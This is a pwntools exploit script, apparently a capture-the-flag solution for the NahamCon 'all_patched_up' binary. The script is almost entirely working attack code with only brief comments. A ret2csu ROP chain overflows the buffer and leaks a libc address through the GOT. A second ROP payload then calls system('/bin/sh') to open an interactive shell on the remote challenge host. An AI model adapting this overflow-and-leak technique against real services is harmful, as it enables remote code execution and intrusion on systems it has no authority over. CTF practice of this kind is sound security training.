#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template all_patched_up_patched --host challenge.nahamcon.com --port 32244
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('all_patched_up_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenge.nahamcon.com'
port = int(args.PORT or 32244)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
init-peda
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)
# RUNPATH:  b'.'

def ret2csu(rbx, rbp, r12, r13, r14, r15, ret):
    payload = flat([
        asm('nop') * padding,
        csu1, rbx, rbp, r12, r13, r14, r15,
        csu2,
        b'0' * 56, # JUNK to  reach the return address
        ret
    ])
    return payload

io = start()

context.log_level = 'debug'

libc = ELF('libc.so.6')

padding = 520

csu1 = 0x40124a # pop r12, r13, r14, r15, mov rdi, 1
csu2 = 0x401230 # rdx, rsi, edi, call [r15 + rbx*8]

payload = ret2csu(rbx=0, rbp=1, r12=1, r13=exe.got.read, r14=8, r15=exe.got.write, ret=exe.sym['main'])

io.sendlineafter(b'>', payload)

leak = unpack(io.recvuntil(b'>')[1:-1].ljust(8, b'\x00'))
libc.address = leak - libc.symbols['read']
info("LIBC Base: " + hex(libc.address))

# Got Shell?

# Nothing works :(
# oneshot1 = 0xe3afe # r12, r15 == NULL
# oneshot2 = 0xe3b01 # r15, rdx == NULL
# oneshot3 = 0xe3b04 # rdx, rsi == NULL
# payload2 = ret2csu(rbx=0, rbp=1, r12=0, r13=0, r14=0, r15=libc.address+oneshot3, ret=ret)

# Using libc ROPgadget (because one_gadget doesn't work, and libc address already leaked)
pop_rdi = libc.address + 0x23b6a # pop rdi; ret;
payload = flat([
    asm('nop') * padding,
    pop_rdi+1, # ret;
    pop_rdi,
    next(libc.search(b"/bin/sh\x00")),
    libc.sym['system']
])

io.sendline(payload)

io.interactive()

